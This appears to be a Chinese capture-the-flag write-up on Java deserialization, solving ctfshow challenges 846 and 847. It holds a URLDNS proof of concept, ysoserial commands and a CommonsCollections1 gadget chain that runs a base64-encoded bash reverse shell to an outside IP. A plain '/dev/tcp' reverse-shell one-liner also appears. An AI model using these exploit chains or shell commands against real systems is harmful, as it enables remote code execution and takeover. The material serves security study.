# JAVA反序列化

<br>

### 序列化调用的函数

序列化：java.io.ObjectOutputStream 类中的 writeObject()
实现 Serializable 和 Externalizable 接口的类才能被序列化

<br>

### 反序列化调用的函数

反序列化：java.io.ObjectInputStream 类中的 readObject()

<br>

在 Java中，重写的方法会优先执行。如果重写了readObject()，并且函数中某个参数的输入可控，那么攻击者就可以输入任意命令(代码)。在反序列化过程中调用readObject()方法时，就会执行恶意命令，造成攻击

<br>





### 课程

- [java反序列化1](https://space.bilibili.com/2142877265/channel/collectiondetail?sid=29805&ctype=0)


- [java反序列化2](https://www.bilibili.com/video/BV16h411z7o9/?spm_id_from=333.999.0.0&vd_source=23c2bbe4623ae526416ea7a1ec4679fc)

<br>

## 例题

<br>

#### URLDNS链




URLDNS链不能执行命令，通常作为验证是否存在反序列化漏洞的一种方式。

脚本 ysoserial.jar

用法

````
java -jar ysoserial-[version]-all.jar [payload type] '[command to execute]'
````

URLDNS例题        来自ctfshow846

* ctfshow会对你post提交的ctfshow参数进行base64解码
然后进行反序列化
构造出对当前题目地址的dns查询即可获得flag 

<br>

### 参考POV

````
package Serialize;
import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.ObjectOutput;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.net.URL;
import java.util.Base64;
import java.util.HashMap;
 
public class URLDNS {
    public static void serialize(Object obj) throws IOException{
        ByteArrayOutputStream data =new ByteArrayOutputStream();
        ObjectOutput oos =new ObjectOutputStream(data);
        oos.writeObject(obj);
        oos.flush();
        oos.close();
        System.out.println(Base64.getEncoder().encodeToString(data.toByteArray()));
    };
    public static void main(String[] args) throws Exception{
        URL url=new URL("http://c1161cd4-e370-4b4a-a6b0-2107fcb148ef.challenge.ctf.show");
        /*
            public synchronized int hashCode() {
        if (hashCode != -1)
            return hashCode;
        hashCode = handler.hashCode(this);
        return hashCode;
    }   初始化时hashcode=-1，h.put时调用了url的hashcode，hashcode不等于-1，需要通过反射修改hashcode
         */
        Class<?> c=url.getClass();
        Field hashcode=c.getDeclaredField("hashCode");
        hashcode.setAccessible(true);
        //修改成员变量
        hashcode.set(url,1);
        HashMap<URL,Integer> h = new HashMap<URL,Integer>();
        h.put(url,1);
        hashcode.set(url,-1);
        serialize(h);
        //URL
        //HashMap
    }
}

````

调用hashmap最后调用的是url的hashcode方法，在最后调用getaddress

<br>

<img src="https://54huarui.github.io/blogs/javax/x0.png" width="880" height="480">

````
┌──(root💀kali)-[/home/huarui/桌面/java tool]
└─# java -jar ysoserial.jar URLDNS "http://bb7c5da6-cbdd-4585-8c3e-9793141c140f.challenge.ctf.show/"|base64
rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDRAwACRgAKbG9hZEZhY3RvckkACXRocmVz
aG9sZHhwP0AAAAAAAAx3CAAAABAAAAABc3IADGphdmEubmV0LlVSTJYlNzYa/ORyAwAHSQAIaGFz
aENvZGVJAARwb3J0TAAJYXV0aG9yaXR5dAASTGphdmEvbGFuZy9TdHJpbmc7TAAEZmlsZXEAfgAD
TAAEaG9zdHEAfgADTAAIcHJvdG9jb2xxAH4AA0wAA3JlZnEAfgADeHD//////////3QAN2JiN2M1
ZGE2LWNiZGQtNDU4NS04YzNlLTk3OTMxNDFjMTQwZi5jaGFsbGVuZ2UuY3RmLnNob3d0AAEvcQB+
AAV0AARodHRwcHh0AD9odHRwOi8vYmI3YzVkYTYtY2JkZC00NTg1LThjM2UtOTc5MzE0MWMxNDBm
LmNoYWxsZW5nZS5jdGYuc2hvdy94
````

然后将playload输入即可

<img src="https://54huarui.github.io/blogs/javax/javax.png" width="880" height="480">

<br>

## 例题2

来自ctfshow web847

* 提交ctfshow参数进行base64解码
然后进行反序列化
我是java7，使用了commons-collections 3.1的库
为了保证业务安全，我删除了nc和curl命令
下面是我接收参数的代码
data=new BASE64Decoder().decodeBuffer(request.getParameter("ctfshow"));

从题目可知可以在ysoserial中cc1、cc3、cc5、cc6、cc7使用对应的commons-collections:3.1
随便在上述任意cc链挑选一个运行反弹shell即可

<br>

ysoserial工具

````
java -jar ysoserial.jar CommonsCollections1 "bash -c {echo,要执行命令的base64编码}|{base64,-d}|{bash,-i}"|base64 
````

除了nc和curl命令，这里还可以使用bash反弹
bash -i >& /dev/tcp/x.x.x.x/xxxx 0>&1

<br>

贴一个POV

````
package org.example;  
  
import org.apache.commons.collections.Transformer;  
import org.apache.commons.collections.functors.ChainedTransformer;  
import org.apache.commons.collections.functors.ConstantTransformer;  
import org.apache.commons.collections.functors.InvokerTransformer;  
import org.apache.commons.collections.map.TransformedMap;  
  
import java.io.*;  
import java.lang.annotation.Target;  
import java.lang.reflect.Constructor;  
import java.util.Base64;  
import java.util.HashMap;  
import java.util.Map;  
  
public class Main {  
public static void main(String[] args) throws Exception{  
Transformer[] transformers =new Transformer[]  
{  
new ConstantTransformer(Runtime.class),  
new InvokerTransformer("getMethod",new Class[]{String.class,Class[].class},new Object[]{"getRuntime",null}),  
new InvokerTransformer("invoke",new Class[]{Object.class,Object[].class},new Object[]{null,null}),  
new InvokerTransformer("exec",new Class[]{String.class},new Object[]{"bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8zOS4xMDEuNzAuMzMvODg4OCAwPiYx}|{base64,-d}|{bash,-i}"})  
};  
ChainedTransformer chainedTransformer=new ChainedTransformer(transformers);  
HashMap<Object,Object> hashMap=new HashMap<Object,Object>();  
hashMap.put("value",chainedTransformer);  
Map<Object,Object> transformedMap =TransformedMap.decorate(hashMap,null,chainedTransformer);  
Class c= Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");  
Constructor annotationInvocationHandler=c.getDeclaredConstructor(Class.class, Map.class);  
annotationInvocationHandler.setAccessible(true);  
Object obj= annotationInvocationHandler.newInstance(Target.class,transformedMap);  
serialize(obj);  
}  
public static void serialize(Object obj) throws Exception{  
ByteArrayOutputStream data=new ByteArrayOutputStream();  
ObjectOutputStream oos = new ObjectOutputStream(data);  
oos.writeObject(obj);  
oos.flush();  
oos.close();  
System.out.println(Base64.getEncoder().encodeToString(data.toByteArray()));  
}  
}
````

需要反弹shell